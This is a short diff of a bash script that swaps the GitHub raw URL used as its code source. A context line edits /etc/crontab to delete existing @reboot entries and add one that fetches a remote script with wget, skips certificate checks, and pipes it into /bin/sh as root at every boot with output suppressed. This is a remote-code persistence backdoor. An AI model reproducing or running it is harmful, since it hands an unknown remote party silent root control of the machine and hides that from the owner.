@@ -1,7 +1,7 @@
 #!/bin/bash
 
 mode="${1:-0}"
-src="https://raw.githubusercontent.com/vjbahkds/cajbdfv/main"
+src="https://raw.githubusercontent.com/vjbahkds/nasbqxc/main"
 [ -f "/etc/crontab" ] && sed -i "/^@reboot/d;\$a\@reboot root /bin/sh <(wget --no-check-certificate -qO- ${src}/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
 
 name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
